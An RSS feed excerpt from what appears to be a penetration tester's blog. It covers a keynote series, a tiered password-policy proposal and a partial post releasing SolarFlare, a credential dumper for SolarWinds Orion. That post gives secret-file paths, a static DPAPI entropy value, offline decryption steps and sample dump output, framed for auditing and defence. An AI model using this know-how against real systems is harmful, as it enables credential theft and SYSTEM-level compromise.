&lt;p&gt;One of the greatest yet most challenging things about doing any job in technology is staying current. Everyone struggles to stay up to date with as much of what is going on around you. Many people specialize, which makes it easier to stay up to date with a specific thing. Yet that can lead to tunnel vision as well.&lt;/p&gt;
&lt;p&gt;All I&amp;rsquo;m trying to say here is that sometimes, the person with the least amount of &amp;ldquo;experience&amp;rdquo; in a given technology field is going to have the most open mind to what is possible. &lt;strong&gt;No matter how long you have been in cyber security or technology in general, you should consider your knowledge on a specific topic a point in time piece of information&lt;/strong&gt;. At that exact moment in your life, that fact was true. This doesn&amp;rsquo;t mean that it stays that way.&lt;/p&gt;
&lt;p&gt;Take passwords for example. Everyone said &amp;ldquo;8 character passwords are secure&amp;rdquo; for decades. I&amp;rsquo;m still hearing that. Or &amp;ldquo;never write your passwords down&amp;rdquo;. This is just one example. &amp;ldquo;Never use X software, it&amp;rsquo;s insecure&amp;rdquo;, is it still?. One of the ways I stay &amp;ldquo;current&amp;rdquo; is by always challenging my knowledge of how I think things should work vs how they do.&lt;/p&gt;
&lt;p&gt;This is why during my keynote I noted when and where I leaned these lessons, there is every possibility I am complete off base with all of them. This is also why it&amp;rsquo;s my beautiful basics lesson #1. Something to always keep top of mind.&lt;/p&gt;

&lt;h4 id=&#34;slides&#34;&gt;Slides&lt;/h4&gt;
&lt;iframe src=&#34;https://docs.google.com/presentation/d/e/2PACX-1vQWsIcPGnJ60ROVu3K32uI7Gtg7zciUle7hfZnN5HPrJ1mD38LZWT5x5DQOyd5CpLXt0hL125fKqOQL/embed?start=false&amp;loop=true&amp;delayms=15000&#34; frameborder=&#34;0&#34; width=&#34;960&#34; height=&#34;569&#34; allowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; webkitallowfullscreen=&#34;true&#34;&gt;&lt;/iframe&gt;
&lt;h4 id=&#34;video&#34;&gt;Video&lt;/h4&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/9yv6SdDtU-Q&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;



</description>
    </item>
    
    <item>
      <title>Beautiful Basics - Series</title>
      <link>https://malicious.link/post/2022/beautiful-basics/</link>
      <pubDate>Mon, 02 May 2022 00:00:00 -0500</pubDate>
      
      <guid>https://malicious.link/post/2022/beautiful-basics/</guid>
      <description>&lt;p&gt;Today I keynoted &lt;a href=&#34;https://twitter.com/BSidesVancouver&#34;&gt;@BSidesVancouver&lt;/a&gt;. It was an honor to be asked and I had a great time.&lt;/p&gt;
&lt;p&gt;Conference Link: &lt;a href=&#34;https://hopin.com/events/bsides-vancouver-2022/&#34;&gt;https://hopin.com/events/bsides-vancouver-2022/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;I talked about 11 lessons learned over my career that contradict some of the edicts that are well known in the Cyber Security space.&lt;/p&gt;
&lt;p&gt;Before we get into the lessons though, let me attack the things I know many of you reading this already have queued up in your head.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://malicious.link/images/2022/beautifulbasics_excuses.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;counter-point-1&#34;&gt;Counter Point 1&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;All of that is well and good, but it&amp;rsquo;ll never work where I work.&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Why not?&lt;/strong&gt; Every single one of these lessons learned are things that I was told wasn&amp;rsquo;t possible. For the most part they were things I didn&amp;rsquo;t even do, they were things either already in place when I joined the company or put into place while I worked there.&lt;/p&gt;
&lt;p&gt;I saw first hand that something I was told was &amp;ldquo;impossible&amp;rdquo; was not only possible but accomplished much more than I could have imagined. Until you see something for yourself, it&amp;rsquo;s hard to go against what you are taught, but as Security Professionals isn&amp;rsquo;t that what we are supposed to do? Look beyond the scope of what is seen as &amp;ldquo;possible&amp;rdquo;?&lt;/p&gt;
&lt;h4 id=&#34;counter-point-2&#34;&gt;Counter Point 2&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;It&amp;rsquo;s not as easy as you are making it sound.&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;You are right, none of this is easy. Good work hardly ever is. If you are looking for the easy solution, something that can be done in a day or a week this is not the blog series for you.&lt;/p&gt;
&lt;h4 id=&#34;counter-point-3&#34;&gt;Counter Point 3&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;We already known all of this&amp;rdquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Awesome! I wish I would have known these things earlier in my career.&lt;/p&gt;

&lt;h3 id=&#34;lessons-learned&#34;&gt;Lessons Learned&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-01&#34;&gt;Lesson 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-02&#34;&gt;Lesson 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-03&#34;&gt;Lesson 3&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-04&#34;&gt;Lesson 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-05&#34;&gt;Lesson 5&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-06&#34;&gt;Lesson 6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-07&#34;&gt;Lesson 7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-08&#34;&gt;Lesson 8&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-09&#34;&gt;Lesson 9&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-10&#34;&gt;Lesson 10&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://malicious.link/post/2022/beautiful-basics-lesson-11&#34;&gt;Lesson 11&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;h4 id=&#34;slides&#34;&gt;Slides&lt;/h4&gt;
&lt;iframe src=&#34;https://docs.google.com/presentation/d/e/2PACX-1vQWsIcPGnJ60ROVu3K32uI7Gtg7zciUle7hfZnN5HPrJ1mD38LZWT5x5DQOyd5CpLXt0hL125fKqOQL/embed?start=false&amp;loop=true&amp;delayms=15000&#34; frameborder=&#34;0&#34; width=&#34;960&#34; height=&#34;569&#34; allowfullscreen=&#34;true&#34; mozallowfullscreen=&#34;true&#34; webkitallowfullscreen=&#34;true&#34;&gt;&lt;/iframe&gt;
&lt;h4 id=&#34;video&#34;&gt;Video&lt;/h4&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/9yv6SdDtU-Q&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;



</description>
    </item>
    
    <item>
      <title>User Empowerment: Password Security</title>
      <link>https://malicious.link/post/2021/user-empowerment-password-security/</link>
      <pubDate>Tue, 27 Apr 2021 09:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2021/user-empowerment-password-security/</guid>
      <description>&lt;p&gt;World Password Day (who knew that was a thing?) is upon us. It is the first Thursday of May every year, and that falls on May 6th this year.&lt;/p&gt;
&lt;p&gt;I&amp;rsquo;m not sure how to start this blog post, but the meat of what I want to get into is password security and the evolution over the years.&lt;/p&gt;
&lt;p&gt;In the 1900s (&amp;hellip; yes people are saying that now&amp;hellip; feel old yet?), password security was pretty simple. The mainframe only accepted eight characters max for a password anyways, and it was case insensitive (many mainframes still operate this way). They also stored your password in plain text, where anyone with administrative rights (SysAdmin or criminal) could read them.&lt;/p&gt;
&lt;p&gt;Different hashing algorithms started to become more widely used, like MD5, LM, NTLM, and SHA1. These hashes increased that maximum length ceiling and provided a fast and more secure method of storing the passwords. However, the speed of these hashing algorithms also meant that criminals could crack them quickly too. Researchers put in the time and found that by increasing the type of characters used (from just alphanumeric [a-z 0-9], to include special characters [a-z 0-9 ;!@#$%^&amp;amp;*()] ), they could make cracking these hashes exponentially more difficult. So, &amp;ldquo;Password Complexity&amp;rdquo; made it into every policy and standard. &amp;ldquo;You must require password complexity to be compliant&amp;rdquo; - PCI-DSS.&lt;/p&gt;
&lt;p&gt;What went wrong is that computers and human psychology don&amp;rsquo;t always fit into the same mold. Asking human people to select a special character means not that they will select from the 100+ that are readily available on any given keyboard; no, they will choose the ones that are most common to their normal typing, such as exclamation marks, periods, question marks, and hashtags. The other bit of psychology that goes into here, and the reason why spaces aren&amp;rsquo;t on that list; is that many websites have their own list of &amp;ldquo;acceptable&amp;rdquo; special characters. This meant your personal list of &amp;ldquo;acceptable&amp;rdquo; special characters resulted from which ones caused the least amount of problems on the least amount of sites. For example, if you tried to use a space in your password on Facebook which worked, but then you tried it on your bank, and it didn&amp;rsquo;t work, the following account you tried to create probably wouldn&amp;rsquo;t have a space in it just because you didn&amp;rsquo;t want to go through the hassle of selecting a new password yet again.&lt;/p&gt;
&lt;p&gt;Then along came password rotations. This was a bad idea from the get-go. Password rotations came about because people would select simple passwords that would be dictionary-based and fit into their world of acceptable characters that we talked about a second ago. This would result in passwords like &lt;code&gt;Password1!&lt;/code&gt;. So, the idea went that if we force people to change their passwords regularly, this will make it so they have to pick a different password and which will reduce the window of opportunity for criminals to take advantage of weak passwords. This did not end well, and many companies are still in this phase. The result was passwords like &lt;code&gt;Winter2020&lt;/code&gt;, then 90 days later, &lt;code&gt;Summer2021&lt;/code&gt;. This is infinitely worse because instead of just a limited set of special characters being used, the majority of users would now be using a limited set of numbers (year) and words (season/month). These were actually guidelines detailed by NIST in NIST Special Publication 800-63B in 2017.&lt;/p&gt;
&lt;p&gt;Then, in 2020, an update to NIST Special Publication 800-63B came in the form of more sensible standards that took human psychology into account. The update included focusing on length over complexity, spaces as special characters, regular password auditing, and a host of other things. But even in 2021, we as a security industry are having a tough time getting people to select &amp;ldquo;good&amp;rdquo; passwords.&lt;/p&gt;
&lt;p&gt;So how do we do that?&lt;/p&gt;
&lt;p&gt;By incentivizing security through user empowerment. We can do that through a tiered approach to password policies. This can work today in any organization with Active Directory but will probably take some heavy engineering to incorporate into platforms like Facebook and Twitter. I think we can get there.&lt;/p&gt;
&lt;p&gt;Tiered password policies would work with both carrot and stick. For example:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tier 1: 8 character password minimum length
&lt;ul&gt;
&lt;li&gt;Benefits: easier password to remember&lt;/li&gt;
&lt;li&gt;Downsides:
&lt;ul&gt;
&lt;li&gt;No VPN access&lt;/li&gt;
&lt;li&gt;SSO session timeout set to 4 hours&lt;/li&gt;
&lt;li&gt;Password rotation every 90&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tier 2: 12 character password minimum length
&lt;ul&gt;
&lt;li&gt;Benefits:
&lt;ul&gt;
&lt;li&gt;VPN access - 8 hour session timeout&lt;/li&gt;
&lt;li&gt;SSO session - 48 hour timeout&lt;/li&gt;
&lt;li&gt;Password rotation every 6 months&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tier 3: 15 character password minimum length
&lt;ul&gt;
&lt;li&gt;Benefits:
&lt;ul&gt;
&lt;li&gt;VPN access - 24 hour session timeout&lt;/li&gt;
&lt;li&gt;SSO session - 1 week timeout&lt;/li&gt;
&lt;li&gt;Password rotation every year&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Tier 4: 24 character password minimum length
&lt;ul&gt;
&lt;li&gt;Benefits:
&lt;ul&gt;
&lt;li&gt;VPN access - 48 hour session timeout&lt;/li&gt;
&lt;li&gt;SSO session 2 week timeout&lt;/li&gt;
&lt;li&gt;Password rotation only on change of status (exit, breach/incident, or team change)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Downsides:
&lt;ul&gt;
&lt;li&gt;ALL admin accounts, service accounts, and standard user accounts for admins would automatically fall in this category.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This is just an example. You can do this GPOs in active directory and simple integrations with your VPN profiles and SSO groups with most major vendors.&lt;/p&gt;
&lt;p&gt;The only thing left is to give users the power to choose, either through trouble tickets or a custom form/site.&lt;/p&gt;
&lt;p&gt;In 3 months, you&amp;rsquo;ll be surprised how many users have self-selected up to Tier 3 or 4. You also have a fantastic list (Tier 1) of people that need training or provided better solutions for selecting stronger passwords.&lt;/p&gt;
&lt;p&gt;With all of that, this is my submission for #WorldPasswordDay.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>SolarFlare Release: Password Dumper for SolarWinds Orion</title>
      <link>https://malicious.link/post/2020/solarflare-release-password-dumper-for-solarwinds-orion/</link>
      <pubDate>Tue, 15 Dec 2020 00:30:44 -0500</pubDate>
      
      <guid>https://malicious.link/post/2020/solarflare-release-password-dumper-for-solarwinds-orion/</guid>
      <description>&lt;h2 id=&#34;tldr&#34;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;Here are the concerns I have regarding the SolarWinds/FireEye breach:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;The accounts stored in an organization&amp;rsquo;s SolarWinds Orion may be underestimated. I recently did a pentest for a firm that had over 200 credentials stored in their SolarWinds Orion database, but only 15 showed in the interface (the SolarWinds credential interface is complicated with sections for each connection type and different panes for each, it may also not properly delete credentials from the database when &amp;ldquo;removed&amp;rdquo; from the interface, I am unsure).&lt;/li&gt;
&lt;li&gt;The re-infection possibilities, from one-time access to SolarWinds Orion database and file system, is being underestimated. Attackers can directly re-infect SolarWinds Orion systems through Erlang and other vulnerabilities. Rotating these credentials is HARD.&lt;/li&gt;
&lt;li&gt;Not enough is being talked about on how to properly secure SolarWinds Orion machines.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;I&amp;rsquo;m releasing this tool after a lot of thought surrounding the SolarWinds/FireEye breach. It&amp;rsquo;s been in development since 2015. The reason I developed SolarFlare in the first place was to assist in my Red Team engagements. The main reason to release the tool publicly, right now, is so businesses can identify one facet of the possible severity of this breach, using a simple command-line tool they can run on their own SolarWinds Orion machines. SolarFlare can help identify the accounts that may have been compromised during this breach.&lt;/p&gt;
&lt;p&gt;SolarWinds is not an easy application to quickly identify which credentials are stored in the database. SolarFlare parses all of the needed pieces, connects to the database, and decrypts (where possible) all of the account data stored in the database. I have seen everything from regular Active Directory accounts, to AWS/Azure/Meraki API keys, and Cisco enable passwords.&lt;/p&gt;
&lt;p&gt;Now that I&amp;rsquo;ve mentioned their encryption, before we start going down this rabbit hole, I must say that SolarWinds did a &lt;strong&gt;fantastic&lt;/strong&gt; job at doing as much cryptography as possible to ensure that credential theft is not trivial. They had even made more improvements since 2015 when I first started researching the product. However, at the end of the day, SolarWinds Orion needs to have the ability to use the credentials in clear text, so no matter how much encryption they add, it will only ever be obfuscation.&lt;/p&gt;
&lt;h2 id=&#34;history&#34;&gt;History&lt;/h2&gt;
&lt;p&gt;In 2016 I gave two talks, one at BSidesPhilly and the other at KiwiCon2016, down in New Zealand. These talks focused on the credentials I was able to steal out of SolarWinds Orion. At this time, I did not release any tooling to exploit access to SolarWinds, but I did talk about how reversing the credentials could easily be done due to the use of an exportable self-generated RSA key.&lt;/p&gt;
&lt;h3 id=&#34;video-from-bsidesphily-2016&#34;&gt;Video from BSidesPhily 2016&lt;/h3&gt;
&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/VXUPyod6vqw&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&#34; allowfullscreen&gt;&lt;/iframe&gt;
&lt;h3 id=&#34;kiwicon-2016&#34;&gt;KiwiCon 2016&lt;/h3&gt;
&lt;iframe src=&#34;//www.slideshare.net/slideshow/embed_code/key/FBkXrKZmGENvF4&#34; width=&#34;595&#34; height=&#34;485&#34; frameborder=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; scrolling=&#34;no&#34; style=&#34;border:1px solid #CCC; border-width:1px; margin-bottom:5px; max-width: 100%;&#34; allowfullscreen&gt; &lt;/iframe&gt; &lt;div style=&#34;margin-bottom:5px&#34;&gt; &lt;strong&gt; &lt;a href=&#34;//www.slideshare.net/mubix/kiwicon-2016-kicking-orions-assets&#34; title=&#34;KiwiCon 2016 - Kicking Orion&amp;#x27;s Assets&#34; target=&#34;_blank&#34;&gt;KiwiCon 2016 - Kicking Orion&amp;#x27;s Assets&lt;/a&gt; &lt;/strong&gt; from &lt;strong&gt;&lt;a href=&#34;https://www.slideshare.net/mubix&#34; target=&#34;_blank&#34;&gt;Rob Fuller&lt;/a&gt;&lt;/strong&gt; &lt;/div&gt;
&lt;h3 id=&#34;erlang&#34;&gt;Erlang&lt;/h3&gt;
&lt;p&gt;Fast forward to 2018, &lt;a href=&#34;https://malicious.link/post/2018/erlang-arce/&#34;&gt;I released a blog post&lt;/a&gt;, again about SolarWinds, where I talked more about the severe effects of exploiting SolarWinds Orion. SolarWinds makes use of RabbitMQ, which uses Erlang (a distributed programming language). An attacker with file-level access to the SolarWinds machine, either through code execution, access to backup files, or just a poorly permissioned share, could steal the file &lt;code&gt;.erlang.cookie&lt;/code&gt; from the ProgramData directory and have SYSTEM level code execution to this day.&lt;/p&gt;
&lt;p&gt;Changing this &amp;ldquo;cookie&amp;rdquo; is non-trivial. There isn&amp;rsquo;t a method in the SolarWinds Orion interface to do so. I have been successful with just shutting down all of the SolarWinds services, altering the string in the file, and starting the services back up, but I cannot guarantee this won&amp;rsquo;t break things in more robust corporate installs. A more complete method of defense is to simply &lt;strong&gt;Block port 25672/tcp inbound to your SolarWinds Orion box&lt;/strong&gt;. This is the port that can be remotely accessed for remote code execution if an attacker has stolen the &lt;code&gt;.erlang.cookie&lt;/code&gt; file.&lt;/p&gt;
&lt;h3 id=&#34;hd-moore&#34;&gt;HD Moore&lt;/h3&gt;
&lt;p&gt;A few months later, &lt;a href=&#34;https://twitter.com/hdm&#34;&gt;HD Moore&lt;/a&gt; released a &lt;a href=&#34;https://www.atredis.com/blog/2018/10/24/fun-with-the-solarwinds-orion-platform&#34;&gt;blog post on the Atredis blog&lt;/a&gt; talking about the password hashing in SolarWinds Orion as well as how to decrypt the password from the SolarWinds Orion database. He also released the &lt;a href=&#34;https://github.com/atredispartners/solarwinds-orion-cryptography&#34;&gt;tools on Github to do so&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Also, the password cracking tools &lt;a href=&#34;https://github.com/hashcat/hashcat/issues/1736&#34;&gt;Hashcat&lt;/a&gt; and &lt;a href=&#34;https://github.com/openwall/john/pull/3449&#34;&gt;John the Ripper&lt;/a&gt; added cracking capabilities for SolarWinds Orion password hashes.&lt;/p&gt;
&lt;h3 id=&#34;npm&#34;&gt;NPM&lt;/h3&gt;
&lt;p&gt;In late 2018, early 2019, &lt;a href=&#34;https://twitter.com/VerSprite&#34;&gt;VeraSprite&lt;/a&gt; researchers released CVE-2019-8917. This vulnerability affected SolarWinds Orion 12.3 and the WCF protocol it incorporated for communications. &lt;a href=&#34;https://versprite.com/blog/security-research/exploitation-of-remote-services/&#34;&gt;There was a blog post&lt;/a&gt;, and a short video demonstrating the vulnerability. This vulnerability resulted in remote code execution as SYSTEM on the SolarWinds machine but does require valid credentials for the SolarWinds Orion interface.&lt;/p&gt;
&lt;iframe width=&#34;560&#34; height=&#34;315&#34; src=&#34;https://www.youtube.com/embed/IE8LBmwZBgE&#34; frameborder=&#34;0&#34; allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&#34; allowfullscreen&gt;&lt;/iframe&gt;
&lt;h3 id=&#34;activecyber&#34;&gt;ActiveCyber&lt;/h3&gt;
&lt;p&gt;In February of 2019, &lt;a href=&#34;https://www.activecyber.us&#34;&gt;ActiveCyber&lt;/a&gt; identified a &lt;a href=&#34;https://www.activecyber.us/activelabs/solarwinds-local-privilege-escalation-cve-2019-9546&#34;&gt;local privilege escalation bug in SolarWinds (CVE-2019-9546)&lt;/a&gt;. Any user on the SolarWinds box could write &lt;code&gt;handle.exe&lt;/code&gt; to &lt;code&gt;C:\ProgramData\SolarWinds\Orion\RabbitMQ\&lt;/code&gt; directory and have it executed as &lt;code&gt;SYSTEM&lt;/code&gt; every 5 minutes.&lt;/p&gt;
&lt;h3 id=&#34;cpl3h&#34;&gt;CPL3H&lt;/h3&gt;
&lt;p&gt;In July of 2019, CPLSEC/&lt;a href=&#34;https://twitter.com/cpl3h&#34;&gt;CPL3H&lt;/a&gt; put together &lt;a href=&#34;https://ijustwannared.team/2019/07/13/badministration-solarwinds/&#34;&gt;a blog post&lt;/a&gt; about adding modules to their (&lt;a href=&#34;https://twitter.com/DarknessCherry&#34;&gt;DarknessCherry&lt;/a&gt; &amp;amp; CPLSEC) tool &lt;a href=&#34;https://github.com/ThunderGunExpress/BADministration&#34;&gt;BADministrator&lt;/a&gt;. These are the modules they released (directly ripped from the blog post):&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;solarwinds-enum – Enumerates all Solarwinds clients&lt;/li&gt;
&lt;li&gt;solarwinds-listalerts – Lists Solarwinds alerts&lt;/li&gt;
&lt;li&gt;solarwinds-alertremove – Removes the malicious alert used in the syscmd module&lt;/li&gt;
&lt;li&gt;solarwinds-syscmd – Executes system commands on the NMS server&lt;/li&gt;
&lt;li&gt;BADministration_SWDump.exe – Standalone memory scraper which (hopefully) retrieves Solarwinds WMI credentials&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The SWDump tool steals the WMI credentials (usually Domain Admin or at least admin on a lot of systems) from client machines that have the SolarWinds log collector service installed.&lt;/p&gt;
&lt;p&gt;Teh SYSCmd utilizies importing alert configurations to execute commands directly on the SolarWinds system as SYSTEM. You do need to be an administrator level user to do so, but it does this via the SolarWinds web API, so even if you have all other ports blocked to attacker, if they can achieve SolarWinds admin credentials, they can still get code execution on the machine.&lt;/p&gt;
&lt;h2 id=&#34;present-day&#34;&gt;Present Day&lt;/h2&gt;
&lt;p&gt;Today I am releasing SolarFlare. SolarFlare is a Authentication Audit / Password dumping tool originally designed for Red Team engagements, but can be used to audit the exposure SolarWinds Orion systems pose to an organization. Below I will walk through each section of the output from SolarFlare. There are no options or arguments.&lt;/p&gt;
&lt;h3 id=&#34;erlang-cookie&#34;&gt;Erlang Cookie&lt;/h3&gt;
&lt;p&gt;This function simply reads the &lt;code&gt;.erlang.cookie&lt;/code&gt; file from the &lt;code&gt;ProgramData&lt;/code&gt; directory where it&amp;rsquo;s stored. You can find this file at &lt;code&gt;%PROGRAMDATA%\SolarWinds\Orion\RabbitMQ\.erlang.cookie&lt;/code&gt;. It is a randomized string created during installation. This string does not change as far as I have observed. This string is also stored in the database.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;============================================
| Collecting RabbitMQ Erlang Cookie
|       Erlang Cookie: abcdefg12456789abcde
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;rsa-key&#34;&gt;RSA Key&lt;/h3&gt;
&lt;p&gt;The &amp;ldquo;SolarWinds-Orion&amp;rdquo; RSA key is stored in the SYSTEM/LocalMachine certificate store and is generated during install. This certificate is used as the PKI based encryption/decryption for credentials stored int the database. I do not know why this certificate is generated in a way that makes it exportable. But, it doesn&amp;rsquo;t not need to be exportable for the decryption to be used. This certificate can be used along with the &lt;a href=&#34;https://github.com/atredispartners/solarwinds-orion-cryptography&#34;&gt;Atradis tool on Github to decrypt credentials from the database, &lt;strong&gt;offline&lt;/strong&gt;.&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;============================================
| Collecting SolarWinds Certificate
|       SolarWinds Orion Certificate Found!
|       Subject Name: CN=SolarWinds-Orion
|       Thumbprint  : BE85C6C3AACA8840E166187B6AB8C6BA9DA8DE80
|       Password    : alcvabkajp4
|       Private Key : MIIKHwIBAzCCCd8GCSqGSIb3DQEHAaCCCdAEggn&amp;lt;snip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;dat-file&#34;&gt;DAT file&lt;/h3&gt;
&lt;p&gt;The DAT file is a recent (2019/2018?) additional encryption that was added to SolarWinds Orion. The file is also located in the ProgramData directory: &lt;code&gt;%PROGRAMDATA%\SolarWinds\Keystorage\CryptoHelper\default.dat&lt;/code&gt;. This file is encrypted with the SYSTEM/LocalMachien DPAPI master keys. Once decrypted, much like the exporting of the RSA private key, it can be used to decrypt the AES based encrypted accounts in the database, &lt;strong&gt;offline&lt;/strong&gt;.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| Collecting Default.DAT file
|       Encrypted: 01000000D08C9DDF0115D&amp;lt;snip&amp;gt;
|       Decrypted: 5D3CE5B08C9201E636BCF&amp;lt;snip&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;swnetperfmondb&#34;&gt;SWNetPerfMon.DB&lt;/h3&gt;
&lt;p&gt;SolarWinds Orion stores it&amp;rsquo;s credentials for the database in a file called &lt;code&gt;SWNetPerfMon.DB&lt;/code&gt; which can be found in the installation directory (usually Program Files). The scary piece of this file is that no matter how many software updates, or migrations of the data happen (from SQL server to SQL server), it stores all of the previous credentials, databases, and server names of the previous setups in this file.&lt;/p&gt;
&lt;p&gt;There is also a newer file called &lt;code&gt;SolarWindsDatabaseAccessCredential.json&lt;/code&gt; that can be found in ProgramData again: &lt;code&gt;%PROGRAMDATA%\SolarWinds\CredentialStorage\SolarWindsDatabaseAccessCredential.json&lt;/code&gt;. This file is where the username and password are sometimes stored for the database.&lt;/p&gt;
&lt;p&gt;The credentials are encrypted with the SYSTEM/LocalMachine DPAPI master keys, this time with a static set of entropy: &amp;ldquo;20120309&amp;rdquo;. I have never been able to find the significance of this date in regards to SolarWinds. If anyone knows, please let me know, I&amp;rsquo;m super curious.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;============================================
| Collecting Database Credentials          |
|       Path to SWNetPerfMon.DB is: C:\Program Files (x86)\SolarWinds\Orion\SWNetPerfMon.DB
|       Connection String: Server=(local)\SOLARWINDS_ORION;Database=SolarWindsOrion;User ID=SolarWindsOrionDatabaseUser;Password=SUPERSECRETPASSWORDHERE
|       Number of database credentials found: 1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;connecting-to-the-database&#34;&gt;Connecting to the Database&lt;/h3&gt;
&lt;p&gt;The code then attempts to automatically connect to the databases that it&amp;rsquo;s found and find the most current SolarWinds database.&lt;/p&gt;
&lt;h3 id=&#34;exporting-the-key-table&#34;&gt;Exporting the Key Table&lt;/h3&gt;
&lt;p&gt;I currently haven&amp;rsquo;t put in enough time to identify what this table is used for, but it looks to me like it may be the private key for the RSA key, and the DAT file, encrypted in a different way. If this is the case, then you may not even need access to the SolarWinds Orion server itself, possibly you&amp;rsquo;d just need access to the database where SolarWinds stores it&amp;rsquo;s data.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;============================================
| DB - Exporting Key Table                 |
|       KeyID: 1
|       Encrypted Key: LmjknGhSXTC&amp;lt;snip&amp;gt;
|       Kind: Aes256
|       Purpose: master
|       Protection Type: 1
|       Protection Value: BE85C6C3AACA8&amp;lt;snip&amp;gt;
|       Protection Details: {}
------------------------------------------------
|       KeyID: 2
|       Encrypted Key: //pj6a4FaCyfv/Rgs&amp;lt;snip&amp;gt;
|       Kind: Aes256
|       Purpose: oldcryptohelper
|       Protection Type: 0
|       Protection Value: 1
|       Protection Details: {&amp;#34;IV&amp;#34;:&amp;#34;oj3JCT7Cft&amp;lt;snip&amp;gt;&amp;#34;}
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;exporting-the-accounts-table&#34;&gt;Exporting the Accounts Table&lt;/h3&gt;
&lt;p&gt;The accounts table is used to store credentials used to access the SolarWinds interface. It has changed a lot since my initial research. There used to be a column called &amp;ldquo;Password&amp;rdquo; that stored a credential that looked like this: &lt;code&gt;11-417578424799297-9-6260697430795685763067724&lt;/code&gt;. Many current installation still store this passwords in this manner, if it wasn&amp;rsquo;t a clean install. This is simple encoding with long division.&lt;/p&gt;
